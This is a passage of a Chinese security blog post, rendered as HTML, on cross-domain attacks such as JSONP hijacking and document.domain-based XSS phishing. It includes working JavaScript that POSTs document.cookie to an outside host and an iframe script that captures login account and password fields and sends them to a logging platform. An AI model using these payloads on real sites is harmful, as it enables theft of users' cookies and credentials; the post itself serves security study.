html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">hackfun</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> datas = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> key in obj) &#123;</span><br><span class="line">                <span class="keyword">var</span> tmp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                tmp = key+<span class="string">&#x27;:&#x27;</span>+obj[key]+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                datas += tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            fetch(<span class="string">&#x27;//68943a75.y7z.xyz/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: document.cookie</span><br><span class="line">            &#125;);</span><br><span class="line">    	&#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;http://a.x.com/json.php?callback=hackfun&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击思路三（误）"><a href="#攻击思路三（误）" class="headerlink" title="攻击思路三（误）"></a>攻击思路三（误）</h2><p>假设<code>a.x.com</code>与<code>x.com</code>相互信任，利用<code>b.x.com</code>的XSS钓取a登录处的帐号密码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- a.x.com/login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>悲催的A<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left: 100px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span> <span class="attr">action</span>=<span class="string">&quot;//baidu.com&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            账户：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;account&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;passwd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&quot;x.com&quot;</span>;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- b.x.com --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>有XSS的B<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;iframe&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//a.x.com/login.html&quot;</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">height</span>=<span class="string">100%</span> <span class="attr">frameborder</span>=<span class="string">0</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.domain=<span class="string">&#x27;x.com&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ifrm = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;iframe&#x27;</span>).onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            ifrm.document.getElementById(<span class="string">&#x27;submit&#x27;</span>).onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> account = ifrm.document.getElementById(<span class="string">&quot;account&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> passwd = ifrm.document.getElementById(<span class="string">&quot;passwd&quot;</span>).value;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> url = <span class="string">&#x27;//WebLog/?account=&#x27;</span>+account+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;passwd=&#x27;</span>+passwd;</span></span><br><span class="line">                fetch(url, &#123;</span><br><span class="line"><span class="javascript">                    mode: <span class="string">&#x27;no-cors&#x27;</span></span></span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>实战中XSS通常有限制，没机会插这么多代码进去，所以一般采用外联JS的方式引入，浏览器虽然会在控制台中报跨域错误并拦截响应，但通常仍可以正常发出请求并将敏感数据带至WebLog平台。抓包分析可以发现，虽然<code>&lt;iframe&gt;</code>放在了<code>&lt;script&gt;</code>前面，不过浏览器的请求顺序是：</p>
+<ol start="0">
+<li><p>加载主页面</p>
+</li>
+<li><p>加载iframe<strong>标签</strong></p>
+</li>
+<li><p>加载外联JS</p>
+</li>
+<li><p>加载iframe<strong>内容</strong></p>
+</li>
+<li><p>用户按下<code>提交</code>按钮</p>
+</li>
+<li><p>执行劫持函数</p>
+</li>
+<li><p>表单提交</p>
+</li>
+</ol>
+<p>这里说这么细是因为发现了一个有趣但蛋疼的问题，最初用作触发劫持函数的代码其实是用<code>document.getElementById(&#39;login&#39;).onsubmit</code>监测表单提交实现的，测试过程中一会可以一会嗝屁特别玄学，接着就开始了三天的对 浏览器、服务器、操作系统、网络地址、网络环境 一千多次的黑盒交叉测试（哭了），最终将影响因素锁定在表单提交后的新页面加载速度上。</p>
+<p>因为如果 后者的加载速度 比 监测到表单提交并执行劫持函数 这一过程的速度要更快的话，新来的页面会将在内存中还未来得及执行完的劫持函数给刷掉。。。。。由于表单提交的默认监听事件是鼠标点击<code>提交</code>按钮（按下再松开），所以我将劫持函数的监听事件改为了检测鼠标按下，这样如果按下<code>提交</code>按钮后松得慢一点，就能产生一个让劫持函数执行完的时间缝隙Orz。。。。。当然如果点击的手速够快的话仙人可能也跳不到你</p>
+<p>回过头看之前的实现方式，则是等用户点击<code>提交</code>按钮后，劫持函数 与 新页面加载 同时执行，拼的是 WebLog平台所在服务器 与 新页面所在服务器 的响应速度，不确定性就太多了。。。。。而改为 检测鼠标按下 后则在此基础上又开辟了 受害者点击 手速这个时间窗口23333</p>
+<p>更新：经p师傅提醒，监听鼠标点击可能会错过通过<code>回车</code>或是<code>自动填充提交</code>方式提交的表单，所以为了保险可以两种方式同时使用</p>
+<p>到此为止，有没有觉得哪里有点不对劲？如果目的是想利用<code>b.x.com</code>的XSS钓取a的帐号密码的话，为何不直接通过JS重写b的页面仿造成a登录处的样子并劫持表单输入呢？干嘛要用什么鬼跨域的逻辑绕来绕去（淦）</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-origin policy</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">Using Fetch</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/208672.html">浅谈跨域威胁与安全</a></p>
+
+      </div>
+      
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/CORS/">CORS</a>
+            <a href="/tags/jsonp/">jsonp</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Python沙箱逃逸</span>
+        <span class="prev-text nav-mobile">上一篇</span>
+      </a>
+    <a class="next" href="/2020/08/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        <span class="next-text nav-default">Phar反序列化</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hosch3n@protonmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/hosch3n" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2021 - 2022<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">hosch3n</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
